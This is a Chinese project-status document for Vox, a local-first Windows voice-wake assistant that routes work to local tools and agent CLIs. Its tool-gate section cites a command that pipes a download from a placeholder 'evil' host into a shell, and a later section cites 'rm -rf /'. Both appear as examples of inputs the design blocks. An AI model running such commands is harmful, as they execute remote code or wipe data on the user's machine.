# 项目总览与当前进度

> 工作区:`D:\program\vioce-wake`
> 最后更新:2026-08-23（VoiceRuntime、麦克风采集与 DesktopBridge 生命周期加固）
> 本文件是项目的单一入口(single source of truth,唯一事实来源),其它文档由此索引。

## 1. 项目是什么

**Vox** 是面向 Windows 的**开放式语音唤醒对话平台**。目标交互链路:

```
说出唤醒词 → 声纹确认是本人 → 唤醒球弹出 → 本地识别语音
    ├─ 简单的事:平台自己做(读文件 / 搜索 / 终端 / 记忆),毫秒级
    └─ 复杂的事:派发给 claude / codex / opencode / hermes,路由汇总
→ 流式回复 → TTS 朗读 → 继续多轮对话 → 可随时打断
```

Phase 3 原型的定位是「EvoX 语音唤醒对话客户端」。Phase 4 起 EvoX **降级为众多 agent 后端之一**,平台不再绑定单一后端。未授权的声音在声纹门被**静默**挡下 —— 不弹球、不出声、不给任何反馈。

三条设计红线(贯穿全部实现):

1. **本地优先(local-first)** — 唤醒、端点检测(VAD)、语音合成全部在本机运行,项目代码不保存、不上传音频。声纹校验也落在本机,零云调用;记忆只存文本、永不存音频。
2. **组件可替换(replaceable providers)** — 唤醒、ASR、LLM、TTS、会话传输层、**agent 后端**都在契约(contract)之后,任何第三方 SDK 类型不得泄漏进公开事件结构。
3. **验证等级诚实(honest verification levels)** — 文档声明必须标注证据来源,自动化测试不得冒充真机验收。**mock 子进程不得冒充真实 agent**。

## 2. 当前状态速览

| 维度 | 状态 |
|---|---|
| 阶段 | Phase 3(原型与决策)已完成;**Phase 4(生产实现)进行中** —— P0 骨架 + P1 声纹门 + P2 平台契约 + P3 记忆 + P4 工具与安全门 + P5 agent 适配器 + **P6 派发层** + **P7 ACP/HTTP 适配器**已落,`VoiceRuntime` 已把语音接进派发,「Python→桌面事件通道」已接线(代码级) |
| 技术选型 | **已定案**,见 [ADR 001](adr/001-voice-stack-selection.md) ~ [ADR 005](adr/005-task-dispatch-model.md) |
| Python 测试 | **628 passed, 3 skipped**（全量 AUTO；DesktopBridge 专项 **33 passed**、采集专项 **36 passed**；无真实设备） |
| 前端构建 | `npm run build`(tsc + vite)通过;`cargo check` 通过 |
| 真机麦克风唤醒 | **已验证一次**(2026-07-26,`你好问问`,7.193s;当时打印的 score 1.0 是硬编码常量,不是测量值 —— 已改正,见 §7) |
| 声纹准入 | 门**已接线**,模型已下载(dim 512);判别力 **AUTO 已验**(簇内 0.736 / 簇间 0.370,阈值 0.5 落在间隙);校验耗时 41 ms;**真机通过率未验** |
| 事件契约 | 语音 9 种 + 平台 12 种,**两个文件一个信封**、枚举互斥;语音契约字节不变由 SHA-256 钉死 |
| 平台层四包 | `memory`(P3)、`tools`(P4)、`agents`(P5)与 **`dispatch`(P6)全部已实现** |
| 本地工具 | 门(`policy.py`)+ `fs.read` / `web.search` / `shell.run` **已实现**,`voice` 与 `agent` 同一道门;`shell.run` 默认关、危险模式不可配置;`web.search` 无内置后端 |
| agent 适配器 | `cli`(headless 子进程)、`evox`(包装会话桥接)、`acp`(JSON-RPC 2.0 over stdio)、`http`(OpenAI 兼容 SSE)**全部已实现**,`config/agents.toml` 已落;http token 只从环境变量读,url 遵循桥接同款回环/凭据约束 |
| 派发层 | `intent` / `router` / `aggregator` / `breaker` / `dispatcher` **已实现并测过**(159 用例);`task.*` / `agent.*` 有了产出点。**已接入 `VoiceRuntime`**；运行时具备启动回滚、幂等关闭和回合失败恢复 |
| 唤醒球 UI | 六态 + 展开态 + 工具确认卡 **DOM/CSS 已实现**,Rust 侧选择性穿透已实现;**Python→桌面事件通道已接线**,真机验收未做 |
| 真实 EvoX 会话桥接 | **未验证** — 发布阻塞项 |
| 真实外部 agent | **未验证** — 发布阻塞项(REAL-AGENT) |
| 真实透明窗口验收 | **未验证** — 发布阻塞项 |
| 版本控制 | 已推送到 `https://github.com/DUEDCL/vox-.git`;最近完成 DesktopBridge 与 Agent 失败路径加固，当前分支仍需独立审查 |

## 3. 已定案的技术选型

| 层 | 选定方案 | 备选/降级 |
|---|---|---|
| 语音运行时 | **sherpa-onnx 1.13.4**(单一依赖边界,覆盖 KWS/VAD/ASR/TTS) | openWakeWord(唤醒)、faster-whisper / SenseVoiceSmall(ASR)、Kokoro-82M(TTS) |
| 唤醒(KWS) | sherpa-onnx-kws-zipformer-wenetspeech-3.3M | — |
| 端点检测(VAD) | Silero VAD(经 sherpa-onnx 执行) | — |
| 语音识别(ASR) | sherpa-onnx-streaming-zipformer-zh-14M(流式 transducer,带端点检测) | faster-whisper / SenseVoiceSmall |
| 语音合成(TTS) | vits-melo-tts-zh_en(MeloTTS) | Kokoro-82M |
| EvoX 桥接 | `LocalEvoXTransport`(带认证的 localhost HTTP) | 任何实现 `ConversationTransport` 协议的传输层 |
| 声纹准入 | **3D-Speaker ERes2Net**(经 sherpa-onnx 执行,零新依赖) | 同系列 200k 通用模型 |
| agent 接入 | **headless CLI 子进程 + ACP** 双通路 | OpenAI 兼容 HTTP(含 OpenClaw Gateway) |
| 记忆存储 | **SQLite + FTS5**(单文件)+ Markdown 人类可读层 | — (明确不做向量检索) |
| 派发模式 | **`single`(默认)/ `race`** | `fanout` 仅显式请求多方验证时 |
| UI 渲染 | **Canvas 2D(v1 主路径)** + CSS 玻璃层 | 静态 CSS(降级档)、WebGL shader(v2 升级路径) |
| 桌面外壳 | Tauri 2 + TypeScript + Vite | — |

## 4. 已完成的工作

### Phase 1–2:调研与选型
- `docs/research/evox-community.md` — EvoX/EvoMap 社区入口排查,**未发现可验证的原生语音资产**。
- `docs/research/open-source-landscape.md` — 候选方案实地核查。
- `docs/research/selection-matrix.md` — 9 维度加权打分矩阵(语音核心 + UI 技术两张表)。

### Phase 3:原型与决策(t10–t13,本轮完成)
- **t10 语音栈整合验证** — `tmp_proto/t10_voice_stack_validation.py`,6 项全部通过。
- **t11 渲染路线原型** — `tmp_proto/orb_spike.html`,三条路线全部可用。
- **t12 结果记录** — `prototype-results.md` 补充验证等级图例、环境记录、复现命令索引。
- **t13 ADR 定案** — 最终语音组件、桥接方式、渲染路线、备选实现、发布阻塞项。

### Phase 4:平台化 P0 骨架(2026-08-02)
- **`core/audio` 拆包** — 295 行的 `providers.py` 按职责拆成 6 个模块,`providers.py` 留 29 行重导出薄壳,现有导入零改动。
- **声纹 provider 补完** — `embed` / `enroll` / `verify` / `remove` / `describe` / `close`,fail-closed 四条路径全部有测试。
- **`core/events.py` 抽出** — 信封的唯一构造与校验点,事件枚举运行时从契约文件读,不在 Python 里镜像。
- **平台层四包建骨架** — `agents` / `dispatch` / `tools` / `memory`,只有契约无实现。
- **测试边界归位** — t10 的行为断言升格 `tests/integration/`,需真实硬件的脚本移入 `scripts/acceptance/`。
- **ADR 002–005 定案** — 声纹准入、agent 接入协议、记忆架构、任务派发模型。

### Phase 4:P1 声纹门(2026-08-02)
- **3 秒内存环形缓冲** — `core/audio/ring.py`,约 192 KB @16 kHz float32。红线 1 的字面执行点:AST 断言该模块只 import `numpy`/`typing`,不出现任何文件、套接字、子进程标识符。
- **门接在 KWS 命中的瞬间** — ADR 002 的 (A) 方案。未授权者连球都不弹,拒绝发生在任何交互之前。
- **fail-closed 五条路径** — 模型缺失 / 无人注册 / 无 verifier / 校验抛异常 / 分数低于阈值,全部落在拒绝一侧。前三条在 `start()` 就拒绝**且不留开着的设备**。
- **`wake.rejected` 有了产出点** — 静默:不改状态、不发回复、不弹球。事件只为事后能回答「刚才为什么什么都没发生」。
- **模型已下载并实测** — dim 512,冷加载 0.234 s,校验 41 ms(NFR-1.9 目标 300 ms)。真实人声簇内 0.736 / 簇间 0.370,默认阈值 0.5 落在间隙内。
- **`feed()` 的诚实性缺口已补** — 见下节。
- **录入 CLI** — `scripts/enroll_speaker.py`,追加语义,音频只在内存里。

### 一个被改正的不诚实数字

原 `feed()` 对每次命中报 `score=1.0`。核实结果:sherpa-onnx 1.13.4 的 `KeywordResult` 只有 `keyword` / `timestamps` / `tokens`,**这个绑定根本不暴露置信度**。那个 `1.0` 看起来像测量值而不是测量值,并且已经进过 2026-07-26 的真机记录。现在 `feed()` 返回 `(keyword, None)` —— `None` 是一个经核实的陈述;进入 `wake.detected` 的数字改成声纹余弦相似度,那个**是**测出来的。

### Phase 4:P2 平台事件契约(2026-08-02)
- **两个契约,一个信封** — 平台 12 种事件走新增的 `contracts/agent-events.schema.json`,`voice-events.schema.json` 一个字节没动。信封逐字段同形、两个 `type` 枚举互斥,这两条是有测试的:同形让两条流能在传输边界合流,互斥让 `contract_for()` 不歧义。
- **字节不变从意愿变成约束** — NFR-5.8 此前只是「我们没打算改它」。现在 `tests/test_agent_event_schema.py` 用 SHA-256 摘要钉住语音契约(575 字节,`4f60…5de5`),原地编辑会立刻变红,并在断言消息里说明该去哪个文件加事件。
- **`validate_any_event()` 是合流点,不是放宽** — 它按 `type` 查表选契约;调用方只归属单一契约时继续传路径,这样把平台事件送进语音流仍然会响。宽松路径是显式选择的。
- **配置校验先于配置文件** — `contracts/agents.schema.json` + `core/agents/schema.py`(146 行手写子集校验器)。16 条拒绝路径有测试,报错指到 `agents[1].kind` 这种具体位置。`kind` 枚举与 `AGENT_KINDS` 由测试锁死相等 —— 否则会出现「配置校验通过、构造适配器时才炸」。
- **一条反向断言** — schema **不许**长出校验器没实现的关键字。声明了却不生效的约束比不声明更糟:它读起来像保护。
- **零新依赖** — 确认 `.venv` 里没有 `jsonschema`,两个校验器都手写,理由与 `core/events.py` 当初一致:契约只有十几行,不值得换一个运行时依赖。

### Phase 4:P3 记忆系统(2026-08-02)
- **三层落在一张表上** — 短期(当前会话轮次)/ 中期(跨会话事实)/ 长期(工具审计与派发统计),`scope` 区分,`records` 一张表加一个 FTS5 索引。单文件、无服务、进程内。
- **FTS5 默认分词器搜不到中文(实测)** — 「用户喜欢用中文交流 and english too」这一行,`MATCH 'english'` 命中,`MATCH '中文'` **不命中**:`unicode61` 把整段连续汉字当一个 token。ICU 没编进来,加分词扩展等于加一个原生依赖。解法是索引**派生 token 列**而不是原文:索引侧 = 单字 + 相邻双字,查询侧 = 只用双字(丢掉单字,才能让「偏好」不去匹配只含「好」的记录)。召回两段式:严格(全词 AND)不中才退到 bm25 排序的宽松(OR)。
- **去重规则写进 schema 而不是写在 writer 里** — `(scope, kind, fingerprint) WHERE scope = 'mid'` 的**部分唯一索引**。只有事实层去重;两句相同的话是两个事件,轮次与审计是时间序列,collapse 掉就毁了长期层存在的理由。
- **凭据整条拒绝,不打码** — 多行私钥是那个决定性例子:模式匹配到头部,打码会把正文存下来。9 个凭据样本被拒且 `count() == 0`,同时 5 句日常话(含「我的密码忘了怎么办」「token 是什么意思」)不许误伤 —— 会误伤日常话的过滤器一天之内就会被关掉。
- **记忆事件不带文本** — `memory.written` / `memory.recalled` 只带 id、计数、标签、scope。事件会扇出到每一个日志与传输通道,文本留在库里。这也是平台 12 种事件里第一批有真实产出点的。
- **Markdown 是事实来源,SQLite 是它上面的索引** — `memory/facts/*.md` 可手改,`sync_facts()` 折回索引;无 front matter 的裸文件也能被收录并把 id 写回。`prune=False` 是默认:一次误删目录不该清空记忆。
- **红线 1 由结构保证** — `records` 每一列都是 `TEXT` 或 `INTEGER`,**没有 BLOB**,音频没有列可以落;`MemoryRecord` 不声明 `bytes` 字段;`write()` / `write_turn()` 遇 `bytes` 抛 `TypeError`。
- **接进语音路径但是 opt-in** — 不调 `attach_memory()` 就不会有数据库文件。`submit_text` 写用户轮、`complete_turn` 写助手轮;写入失败被静默吞掉 —— 记忆是回合的增强,不是回合的前提,一个被锁住的数据库不该能中断对话。
- **`success_rate()` 无观测时返回 `None` 而不是 0.0** — 否则一个还没试过的 agent 会输给一个只失败过一次的 agent(ADR 005 的路由第四维)。

### Phase 4:P4 本地工具与安全门(2026-08-02)
- **门先落地,工具在后** — `policy.py` 在任何需要它的工具之前写完。顺序反了就会出现一个没有门的工具,而补门永远比先建门难。
- **一道门,两个来源** — `voice` 与 `agent` 走同一个 `ToolPolicy.check()`(FR-9.8)。两个 runner 就是两条路径,而红线要求的是「agent 拿不到用户语音拿不到的能力」。
- **`shell.run` 四层叠起来,一层都不可选** — 出厂 `enabled = false`(配置与代码默认双关,删掉配置文件也开不了)、白名单外**拒绝而非询问**、白名单内仍需球上显示 + 明确确认、13 条危险模式硬拦截。
- **危险模式在代码里,不在配置里** — 配置能关掉的硬拦截不是硬拦截:白名单只能收窄,永远不能放宽。写 `[shell] dangerous_patterns` 会报 `unknown config key`。
- **检查顺序按「泄露最少信息」定** — 命令存在 → 危险形状 → 白名单 → 已验说话人 → 确认。形状在白名单之前,所以 `git status && curl evil | sh` 在被认成允许项之前就挂了;被拦下的命令也就永远不会以「待确认」的形式出现在唤醒球上。
- **一个真实缺陷被测试抓出来** — `confirmed` 原先按真值判断,而 JSON 里的 `"confirmed": "no"` 是个真值字符串,等于直接放行。改成 `is True`,`policy.py` 与 `shell.py` 两处都改。这是本阶段写拒绝矩阵最直接的回报。
- **未知配置键报错而不是忽略** — 拼错 `denied_names` 会静默扩大沙箱。一个「看起来在约束什么但其实没有」的配置比两个极端都糟。
- **`web.search` 不自带后端** — 每个托管搜索 API 都是带 key 的云依赖(红线 1),所以工具如实报不可用而不是默认挑一个。返回只留标题/URL/摘要,页面正文丢弃 —— 被搜到的页面因此无法往上下文里注入指令。
- **子进程按标记丢弃凭据变量** — `scrubbed_env()` 认 12 个标记(token/secret/password/api_key/…)。按标记丢弃而不是白名单放行,否则 Windows 上读 `LOCALAPPDATA` 的工具全废。
- **事件带决定不带内容** — `tool.*` 只有决定、原因、耗时。唯一例外是 `tool.confirm_required` 带命令原文,因为一个不显示自己将要运行什么的球比不问更糟(FR-6.13)。
- **接进语音路径但是 opt-in** — 不调 `attach_tools()` 则 `run_tool()` 直接返回 `tools are not attached`。插件**不自造**已验说话人,所以 `shell.run` 经插件必被拒 —— 在 dispatcher 把名字接过来之前(P6),这就是正确答案。
- **测出来的数字** — `fs.read` 4 KB 全路径(过门 + 读 + 事件 + 审计)**0.64 ms** 中位数,拒绝路径 **0.34 ms**(NFR-1.10 目标 < 50 ms)。123 passed, 1 skipped in 0.48 s;全量 300 passed, 3 skipped in 14.31 s。
- **照实记下的四条局限** — 符号链接越界用例在本账户 skip(无建链接权限);`web.search` 从未对接过真实后端;`shell.run` 至今只真实执行过 `git --version`;确认**流程**一行都没实现,那是 P8 且只能 REAL-WIN。

### Phase 4:P5 agent 适配器(2026-08-05)
- **失败是 chunk,不是异常** — 命令不在 PATH、非零退出、超时、取消,四条路径都以带 `error` 的终结 `done` chunk 到达。这不是风格选择:P6 的 `race` 要同时跑两个 agent,若失败以异常形式到达,派发器就得给每条流包一个 `try`,而一个坏 agent 会把整个回合带走。
- **恰好一个 `done`** — JSONL 流里 agent 自己报的 `done` 被折进终结 chunk 而不是直接转发。「每条流恰好一个 `done`」是派发器判断回合结束的唯一依据,转发会让它数到两个。
- **放弃流即杀进程** — 生成器的 `finally` 收尸,所以 `race` 丢弃输家时不留野进程。这条在 P6 之前就得成立,否则等到 P6 才发现时,泄漏的是用户机器上的真实子进程。
- **子进程不继承本进程的凭据** — 复用 `scrubbed_env()`(与 shell 工具同一个按标记丢弃的实现),要给某个 agent 传 key 只能在 `env_passthrough` 里写**变量名**。于是 agent 拿到 token 是一个决定,而不是一次意外。
- **Windows 批处理 shim 走命令行字符串** — npm 把 `claude` 装成 `claude.cmd`,CreateProcess 用 `cmd.exe /c` 跑它;Python 按 C 运行时规则引用参数,不按 cmd.exe 规则。带 `"` 或 `%` 的参数**拒绝而非转义**(BatBadBut 类问题)——一个只对两个解析器之一有效的转义比直接说不更糟。拒绝 shim 本身不是选项:Windows 上它常常是 PATH 上唯一的东西。
- **`evox` 不流式,并且说出来** — 桥接是一次阻塞 POST 返回完整回复,没有增量端点。所以首字延迟 = 整轮延迟,这是端点的属性。给它套一个「看起来增量」的外壳会让路由的延迟数字变成虚构。
- **包装而非移植 `session_bridge`** — 五道安全校验(bearer token 必需、明文 HTTP 仅 loopback、URL 带凭据拒绝、turn_id 编码)因此在每一轮仍然真的跑,并且无法从 `evox.py` 这一侧削弱。
- **取消的时序被如实建模** — 桥接自己分配 turn id 且只在 `send` 返回时才吐出来,所以请求进行中到达的取消**够不着**服务端。它被记下来,在 turn id 存在的那一刻立即补发:回合以 `cancelled` 结束,服务端晚一个往返知道。
- **命令不在 PATH 的条目被保留而不是丢弃** — 可用性是随运行变化的宿主状态。丢掉它会让「少一个 agent」和「配错一个 agent」变得无法区分;`check()` 才是报告可用性的地方。
- **配置里没有放密钥的键** — schema 层面就没有,写 `token = "..."` 直接校验失败。EvoX 的 token 只从环境变量经 `from_env` 读。
- **未实现的 kind 报错而不是空转** — `acp` / `http` 若 `enabled = true` 会带着「落在 P7」报错,想先把配置写进来就设 `enabled = false`。「尚未」不该读起来像「不支持」。

### Phase 4:P6 派发/路由/汇总(2026-08-11)

- **意图的动词必须带边界,不只是锚在开头** — 这是本阶段测试抓出的两个真实缺陷。「运行时报错了怎么办」以「运行」**开头**,所以起始锚点放它过去,capture 把「时报错了怎么办」当 shell 命令跑;「搜索引擎是怎么工作的」同形。运行时、搜索引擎是单个词,分隔符才是「运行 pytest」与「运行时」的区别。修法是 `_VERB_SEP`:动词之后必须是它带的标记(一下 / 命令)或真空白。代价是粘着写法(「查看README.md」)落到 agent —— 落到 agent 是安全方向,跑一条没人要的命令不是。
- **规则不是模型,这是有理由的** — 分类器会给它本该加速的快路径加延迟、给依赖集加一个模型、并且没法确定性地测。规则命中是完全 AUTO 可测的,所以 54 条意图用例里**有 14 条是反向的**:只是「句中含动词」的话必须落到 agent。
- **一次命中不等于命令会跑** — resolver 只分类,`core/tools/policy.py` 才决定。「运行 rm -rf /」照样被分成 `shell.run`,然后死在门上。这条分工在测试里也钉了一条,不只写在 docstring 里。
- **能力是 gate,不是权重** — 声明了做不了 vision 的 agent 不能靠又便宜又快赢下一个 vision 任务,否则那条声明就是装饰。`score()` 仍把它连同各维度报出来(「claude 为什么输了」值得一个答案),`plan()` 不路由给它。四个计分维度权重和为 1.0,于是「免费 + 即时 + 从未失败 + 空闲」正好是 1.0,分数可以直接读。
- **无观测取 0.5 而不是 0** — 一个还没试过的 agent 不该输给一个每轮都失败的 agent,那是整支队伍静默塌到「碰巧先跑的那个」上的方式。越界的 cost / latency 被 clamp 而不是外推:一个报 `cost=-5, latency_ms=1` 的条目不能凭撒谎拿到超过 1.0 的分。
- **`race` 的获胜者在首个 chunk 时决定** — 按「先完成」判定会让**空流**赢,因为它最先完成。带 `error` 的终结 chunk 也算「说话了」:不静默切给输家,否则合并流就变成了一个隐式重试机制,而派发器会把一轮失败记成成功。
- **输家是被停掉,不是被抽干** — 这一层能保证的是输家的 chunk 到不了消费者;真正的收尸靠适配器的 `finally`(P5 已立)。两件事分开断言,免得「没有野进程」这个结论建立在错误的层上。
- **`fanout` 只折叠 `done`** — 每个 agent 自己的 `done` 收进一个合成终结 chunk:elapsed 取最慢、tokens 求和(这一轮两边的钱都花了)、**只有全部失败**才带 error。tokens 全无上报时是 `None` 不是 `0` —— `0` 会被读成「数过,是零」。`tool_call` 一律转发,那是派发器必须看到的内容。
- **`task.progress` 报的是派发集合,不是获胜者** — `AgentChunk` 没有 `agent` 字段,合并后的 chunk 不带来源,所以「谁答的」这个信息在这一层**不存在**。报一个猜的名字比不报更糟,于是 payload 里是 `agents`(复数)加 `first_chunk_ms`。
- **每轮恰好一个 progress,不是每 chunk 一个** — 首字延迟只有一个,重复发会把它变成一条噪音流。
- **12 种事件的枚举是钉死的,没有 `task.completed`** — 本阶段最初写的是 `task.completed`,`validate_event()` 当场炸。五个 sink 的签名也在此统一为 `on_event(event)` 单个已验证信封:breaker 原先是三参 `(type, agent, detail)`,测试按位置解包,改签名不会报错只会静默错位。
- **`needs_confirmation` 被原样带出,派发器永不自动确认** — 有一条测试钉死「恰好调用一次,绝不带 `confirmed=True` 重试」。一个会自己点确认的派发器让 P4 那四层全部失效。
- **失败的一轮也有终结 chunk** — 工具 runner 抛异常、agent 流没有终结 chunk、计划为空(reason 从 router 原样透传),三条路径都以带 error 的 `done` 收尾。事件 payload 只带 error 与 task_id,**不带 text / utterance / reply** —— 有一条测试检查 `repr(events)` 里不出现正文。
- **计划了但没有适配器的 agent 走 `release` 而不是 `record`** — 那是配置不匹配,记进成功率会让平台永久绕开一个其实从没失败过的后端。
- **历史接线缺口已关闭** — 全部 159 条派发用例仍是 AUTO/SIM:agent 是 fake、工具 runner 是 fake、时钟是注入的；但 `VoiceRuntime` 已构造并接入 `Dispatcher`，记忆召回文本已拼入 `Task.context`，`write_turn()` 负责短期层裁剪。当前缺口转为真实 Agent/真实设备验收，不再把旧的「未接 Dispatcher」描述当作现状。

### 已实现的代码骨架

| 模块 | 文件 | 行数 | 说明 |
|---|---|---:|---|
| 事件契约(语音) | `contracts/voice-events.schema.json` | 14 | 9 种事件类型,版本 `"1"`(**字节不变**,SHA-256 钉死) |
| 事件契约(平台) | `contracts/agent-events.schema.json` | 15 | 12 种 `task.*`/`agent.*`/`tool.*`/`memory.*`,信封与语音契约同形 |
| 配置契约 | `contracts/agents.schema.json` | 36 | `config/agents.toml` 的形状,**无放密钥的键** |
| 状态机 | `core/state.py` | 53 | 6 状态 + 严格转移表(**不扩展**) |
| 事件构造 | `core/events.py` | 138 | 信封唯一构造点 + 两契约校验 + `contract_for()` 查表 |
| 配置校验 | `core/agents/schema.py` | 146 | 手写 JSON Schema 子集校验器,报错指到 `agents[1].kind` |
| agent 适配器 | `core/agents/`(`contract`/`cli`/`evox`/`registry`/`schema`) | 1204 | 失败即 chunk、恰好一个 `done`、放弃即杀进程、凭据不继承 |
| agent 配置 | `config/agents.toml` | 86 | 四个后端条目,`claude` 默认开、其余默认关 |
| 语音提供器 | `core/audio/`(7 模块 + `__init__`) | 946 | KWS/VAD/采集/**声纹**/**环形缓冲**/VoxCord |
| 重导出薄壳 | `core/providers.py` | 29 | 保旧导入路径不断 |
| 会话桥接 | `core/session_bridge.py` | 92 | `ConversationTransport` 协议 + HTTP 实现 |
| 派发层 | `core/dispatch/`(`contract`/`intent`/`router`/`aggregator`/`breaker`/`dispatcher`/`__init__`) | 1496 | 规则意图、五维路由(能力是 gate)、三模式汇总(恰好一个 `done`)、熔断器、`task.*` 产出点 |
| 记忆系统 | `core/memory/`(`store`/`write`/`recall`/`__init__`) | 1093 | SQLite + FTS5 单文件、中文双字索引、凭据过滤、Markdown 镜像 |
| 记忆配置 | `config/memory.toml` | 23 | 库路径、事实目录、召回上限、短期保留数 |
| 本地工具 | `core/tools/`(`contract`/`policy`/`fs`/`web`/`shell`/`runner`/`__init__`) | 992 | 一道门两个来源、13 条不可配置的硬拦截、审计落长期层 |
| 工具配置 | `config/tools.toml` | 53 | 沙箱根、拒读名单、`shell.enabled = false`(出厂即关) |
| 插件门面 | `vox_plugin/plugin.py` | 413 | EvoX 工具面 + 回合编排 + 声纹诊断 + 记忆接线 + 工具接线 |
| 声纹配置 | `config/speaker.toml` | 28 | 阈值与时长下限,`tomllib` 读 |
| 录入 CLI | `scripts/enroll_speaker.py` | 125 | 交互式录入,音频不落盘 |
| 前端 | `desktop/src/main.ts` + `style.css` + `index.html` | 1076 | 六态唤醒球、展开态流式文本、工具确认卡(含命令原文)、命中区上报 |
| 窗口 | `desktop/src-tauri/src/main.rs` | 329 | 透明、置顶、无投影、不占任务栏;三个 `vox_*` IPC + 30 ms 光标轮询的选择性穿透 |
| 测试 | `tests/*.py` + `tests/integration/` | — | 631 collected（628 passed + 3 skipped）；DesktopBridge 专项 33 passed，采集专项覆盖启动回滚、回调隔离、ASR/KWS 恢复与幂等停止，见 [测试文档](testing.md) |

## 5. 进行中 / 下一步

**Phase 4 分十阶段,顺序原则:能纯 AUTO 验证的先做,依赖外部 CLI 的次之,依赖真实硬件的最后。**

| 阶段 | 内容 | 证据等级 | 状态 |
|---|---|---|---|
| P0 | 骨架:声纹 provider、`events.py`、四包契约、测试归位、ADR 与文档 | AUTO | ✅ 完成 |
| P1 | **声纹门**:环形缓冲、fail-closed 门、录入 CLI、`wake.rejected` 产出点 | AUTO | ✅ 完成(真机留 P10) |
| P2 | 平台事件契约:`agent-events.schema.json` + `agents.schema.json` | AUTO | ✅ 完成 |
| P3 | 记忆系统 `core/memory/` | AUTO | ✅ 完成(跨进程持久性留 P10) |
| P4 | 本地工具 `core/tools/` + `config/tools.toml` | AUTO | ✅ 完成(真实搜索后端未定) |
| P5 | agent 适配器 `cli.py` + `evox.py` + `registry.py` + `config/agents.toml` | AUTO+SIM | ✅ 完成(真实 CLI 留 P9) |
| P6 | 派发/路由/汇总 `core/dispatch/` | AUTO+SIM | ✅ 完成（已由 `VoiceRuntime` 接入语音路径） |
| P7 | `acp.py` + `http.py` / `openclaw.py` | AUTO+SIM | ✅ 完成(真实 ACP/HTTP 联调留 P9) |
| P8 | 唤醒球弹出 + 工具确认 UI + Python→桌面事件通道 | REAL-WIN | 🔄 DOM/CSS、Rust 侧与事件通道**均已接线**（DesktopBridge 专项 33 passed、cargo test 15 passed）；透明窗口真机验收留 P10 |
| P9 | 真实 agent 联调(`claude` / `opencode` 各一次) | REAL-AGENT | ⬜ |
| P10 | 真实语音端到端(含他人拒绝) | REAL-MIC + REAL-AGENT | ⬜ |

原 Phase 4 计划里的「流式 ASR、TTS 播放队列、超时重连、状态机生产化」并入 P1–P8 各阶段,不单列。

**尚余的接线缺口（有代码但尚未完成真实验收）**:
- `Dispatcher` 已由 `VoiceRuntime.say()` 构造并接进语音路径（`submit_text` → `dispatch` → `complete_turn`）；`VoiceRuntime` 现对启动失败执行资源回滚，对 `close()` 执行幂等清理，并在派发/回合完成异常后恢复到 `LISTENING`。记忆召回文本也已由 `Dispatcher._recall_context()` 拼进 `Task.context`，`write_turn()` 自裁剪（`prune_turns`）
- Python→桌面事件通道 —— 三层已接上：Python `desktop_bridge`（管道） → Rust `spawn_event_reader`（stdin→`vox-bridge`） → 前端 `applyEnvelope`/`askConfirm`；确认应答走 `vox_confirm_reply` 回 stdout。DesktopBridge 已补充重启、EOF、启动回滚和并发关闭保护；**npm build、cargo test 15 passed，真机窗口上的点击/焦点/Esc 仍待 P10 REAL-WIN**
- `web.search` 无真实后端(每个托管 API 都是带 key 的云依赖,红线 1)

## 6. 发布阻塞项(release blockers)

以下每一项都必须有**真机证据**才能关闭。第 1–7 项见 [ADR 001](adr/001-voice-stack-selection.md#required-before-release-blockers),第 8–11 项为 Phase 4 平台化新增:

| # | 阻塞项 | 当前等级 | 需要达到 |
|---|---|---|---|
| 1 | 中文唤醒**质量**验收(安静/远场/噪声/重复) | 单次 REAL-MIC | 多场景 REAL-MIC 统计 |
| 2 | 真实麦克风 Silero 端点检测验收 | 设备开合已验证 | REAL-MIC 语音端点 |
| 3 | **真实 EvoX 会话桥接**(发送/增量回复/取消/超时/重连) | SIM(mock 传输) | REAL-EVOX |
| 4 | 真实流式首字延迟 | 未测 | REAL-EVOX 实测 |
| 5 | **独立透明置顶窗口**(合成/DPI 125-175%/多显示器/托盘/远程桌面) | 定义并编译通过 | REAL-WIN |
| 6 | 持续运行资源画像(≥30 分钟 CPU/内存/FPS) | 未测 | REAL-WIN 长跑 |
| 7 | 提供器可替换性(契约强制,无 SDK 类型泄漏) | AUTO 已验证 | 保持 |
| 8 | **声纹准入实测**(本人通过 / 他人拒绝球不弹 / 录音回放) | AUTO(fail-closed、store、判别力与阈值) | REAL-MIC([ADR 002](adr/002-speaker-verification.md)) |
| 9 | **真实外部 agent 跑通一轮** | 仅契约 | REAL-AGENT([ADR 003](adr/003-agent-integration-protocol.md)) |
| 10 | **工具安全实机**(`shell.run` 确认含拒绝路径、误唤醒防护) | AUTO 全绿(89 条拒绝矩阵) | REAL-WIN 确认流程 + REAL-MIC 误唤醒([ADR 005](adr/005-task-dispatch-model.md)) |
| 11 | **记忆跨会话持久性**(重开进程后事实仍在、手改 Markdown 被下一次召回看到) | AUTO(同进程往返) | REAL([ADR 004](adr/004-memory-architecture.md)) |

## 7. 文档地图

| 文档 | 用途 |
|---|---|
| [handoff.md](handoff.md) | **交接文档**:接手者第一份材料、真机验收顺序、已知缺口 |
| **本文件** | 项目总览、进度、阻塞项(入口) |
| [architecture.md](architecture.md) | 技术架构、组件边界、事件契约、数据流 |
| [requirements.md](requirements.md) | 功能/非功能需求、验收标准、阶段范围 |
| [testing.md](testing.md) | 测试环境、命令、分层、已验证结果与待验收矩阵 |
| [routines.md](routines.md) | 可重复编码例程(改完什么跑什么) |
| [adr/001-voice-stack-selection.md](adr/001-voice-stack-selection.md) | 选型决策记录与发布阻塞项 |
| [adr/002-speaker-verification.md](adr/002-speaker-verification.md) | 声纹准入:为什么零新依赖、门在 KWS 命中时、fail-closed、静默拒绝 |
| [adr/003-agent-integration-protocol.md](adr/003-agent-integration-protocol.md) | agent 接入:ACP + headless CLI 双通路,OpenClaw 作后端而非底座 |
| [adr/004-memory-architecture.md](adr/004-memory-architecture.md) | 记忆:SQLite + FTS5,为什么不做向量与知识图谱 |
| [adr/005-task-dispatch-model.md](adr/005-task-dispatch-model.md) | 派发:路由五维、汇总策略、`fanout` 不做默认、工具政策门 |
| [research/prototype-results.md](research/prototype-results.md) | 原型实测数据与验证等级 |
| [research/selection-matrix.md](research/selection-matrix.md) | 候选方案加权打分 |
| [research/open-source-landscape.md](research/open-source-landscape.md) | 开源候选实地核查 |
| [research/evox-community.md](research/evox-community.md) | EvoX 原生资产排查 |
| [../THIRD_PARTY_NOTICES.md](../THIRD_PARTY_NOTICES.md) | 第三方组件与模型许可证 |

## 8. 已知风险与注意事项

